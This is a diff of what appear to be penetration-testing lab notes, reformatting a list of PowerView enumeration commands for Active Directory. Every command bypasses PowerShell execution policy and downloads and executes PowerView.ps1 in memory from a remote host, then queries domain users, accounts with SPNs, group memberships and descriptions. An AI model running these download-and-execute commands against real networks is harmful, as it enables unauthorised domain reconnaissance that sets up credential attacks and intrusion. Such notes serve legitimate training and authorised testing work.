@@ -24,12 +24,12 @@
 ### Enumeration
 
 PowerView:
-[USER]
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties samaccountname,memberof"
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties samaccountname,description"
+- [USER]
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
+	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
 
 [GROUP]
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins' "
